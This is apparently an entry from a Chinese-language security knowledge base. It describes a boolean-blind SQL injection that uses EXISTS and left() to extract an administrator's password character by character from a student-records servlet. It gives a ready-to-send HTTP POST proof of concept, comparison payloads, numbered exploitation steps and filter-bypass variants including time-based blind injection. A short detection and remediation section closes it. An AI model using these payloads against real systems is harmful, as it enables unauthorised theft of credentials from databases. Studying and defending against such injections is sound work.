---
id: web-generic-sqli-exists-left-boolean-oracle
title: 以“正常/异常回显”为布尔 oracle 的 EXISTS+left() 盲注提取密码
type: scenario
domain: web
path: web/generic/sqli
technique: existence-based-boolean-blind-sqli
aliases:
- 存在性回显盲注
- EXISTS left 盲注
- queryValue 注入
- 布尔盲注
- 正常/异常回显 oracle
tags:
- sqli
- blind
- boolean
- mssql
- exists
- left
- oracle
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V4
  verified_at: '2026-11-04T21:42:49+08:00'
  notes: 已对照原文核对：queryValue拼接、有结果/无结果回显构成布尔oracle，exists+left(passWord,n)逐字符盲注；截图5显示命中返回数据。表名列名及密码已脱敏；未设versions；未执行PoC
---

## 一句话结论

注入点不返回 SQL 报错、也不直接回显字段时，可以把“查询有结果 → 页面正常，查询无结果 → 页面异常/空”当作布尔 oracle，用 `and exists(select ... where left(passWord,1)='h') and '1'='1` 逐字符判断管理员密码前缀，最终还原完整密码。

## 原理

`queryValue` 被拼进 `where` 条件后，页面有三种可区分状态：

- `queryValue=210401010001`：命中学生，正常回显数据；
- `queryValue=210401010001'`：SQL 语法错误，页面异常；
- `queryValue=210401010001' and '1'='1`：条件恒真，正常回显。

把恒真条件替换为业务判断：

```sql
210401010001' and exists(
  select * from USER
  where userNo='admin' and left(passWord,1)='h'
) and '1'='1
```

- 若 `admin` 的密码首字符是 `h`，`EXISTS` 为 true，整个条件成立，查询仍返回学生数据 → **正常回显**；
- 若首字符不是 `h`，`EXISTS` 为 false，查询无结果 → **异常/空回显**。

`left(passWord,n)='...'` 可以一次比较 n 个字符，逐位推进即可还原密码。这个 oracle 依赖“有结果/无结果”的页面差异，不需要数据库报错，也不需要 `UNION` 回显。

## 触发条件

- 参数被拼接进 SQL 且未参数化（示例为 `Statement`/字符串拼接）；
- 页面在“查询有结果”和“查询无结果/语法错误”时有稳定、可区分差异（状态码、长度、内容、跳转均可）；
- 数据库支持 `EXISTS`、`left()`（SQL Server/MySQL 等常见）；
- 当前数据库账户能读目标表（如 `USER`、`met_admin_table`）；
- 有可先验证的正常查询值（如一个存在的学号）。

## 利用步骤

1. 用已知存在的值请求，记录正常响应的状态码/长度/关键字。
2. 加单引号制造语法错误，记录异常响应；确认二者可区分。
3. 用 `and '1'='1` 与 `and '1'='2` 验证布尔 oracle。
4. 用 `exists(select * from USER where userNo='admin')` 确认目标表与账号存在。
5. 用 `left(passWord,n)='前缀'` 逐字符/逐段猜测；可先用 `left(passWord,1)` 确定首字符，再递增 n。
6. 若 `left` 被过滤，改用 `substring`、`ascii(substr(...))`、`LIKE 'a%'` 或时间盲注。

## PoC

```http
POST /servlet/adminServlet HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

operType=6&queryType=1&queryValue=210401010001%27%20and%20exists(select%20*%20from%20USER%20where%20userNo=%27admin%27%20and%20left(passWord,1)=%27h%27)%20and%20%271%27=%271&method=saveItem
```

对照请求：

```text
# 正常回显：首字符是 h
queryValue=210401010001' and exists(select * from USER where userNo='admin' and left(passWord,1)='h') and '1'='1

# 异常/空回显：首字符不是 l
queryValue=210401010001' and exists(select * from USER where userNo='admin' and left(passWord,1)='l') and '1'='1
```

逐字符推进到 `left(passWord,N)='完整密码'` 命中即可。实际参数名、表名、列名按目标调整。

## 变体与关联

- 变体：`substring(passWord,pos,1)='x'`、`ascii(substring(...))>n` 二分、`LIKE 'a%'`、`CHARINDEX`/`INSTR`。
- 变体：无“有结果/无结果”差异时，改用 `IF(...,SLEEP(1),0)` 时间盲注或报错注入。
- 关联：[[web-generic-sqli-metinfo-search-para-base64-blind]]（时间盲注版）；[[web-generic-sqli-mssql-stacked-xp-cmdshell]]（拿到高权限后的命令执行）；[[web-generic-sqli-business-exemption-param-filter-bypass]]（同一系统的过滤器豁免绕过）。
- 不确定点：文章对表名/列名和完整密码做了脱敏；`left()` 在不同数据库中的可用性与大小写敏感性需实测。

## 检测与防御

- **检测**：同一参数出现 `exists(`、`left(`、`substring(`、`ascii(`、`and '1'='1`；响应长度/状态码呈规律性二分变化；同一 IP 对查询接口高频请求。
- **修复**：参数化查询/预编译，禁止字符串拼接；对 `queryValue` 做类型与长度校验。
- **响应收敛**：统一“无结果”和“出错”的页面/状态码，减少布尔差异；错误页不返回 SQL 细节。
- **权限**：数据库账户最小权限，业务账户不授予跨表读取；敏感字段加密/哈希存储。
- **审计**：全库搜索 `createStatement`、`+` 拼接 SQL、`Statement.execute`，优先修复“参数 → SQL → 输出”闭合链。
